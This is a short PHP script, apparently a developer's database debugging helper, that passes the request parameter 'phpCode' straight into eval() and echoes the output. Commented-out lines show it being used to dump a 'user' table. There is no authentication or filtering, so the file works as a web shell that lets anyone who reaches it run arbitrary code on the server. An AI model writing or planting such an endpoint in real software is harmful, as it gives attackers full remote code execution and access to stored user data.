<?php 
require 'refig.php';

/*function _eval($phpCode) {
  return eval('?><?php '.$phpCode);
}*/

/*$_REQUEST['phpCode'] = <<<phpCode
  res(queryData("SELECT * FROM user"));
phpCode;*/

echo eval('?><?php '.$_REQUEST['phpCode'].'?>');


// 查询表中的所有字段
/*$sql = "DESCRIBE  user";
print_r(queryData($sql));*/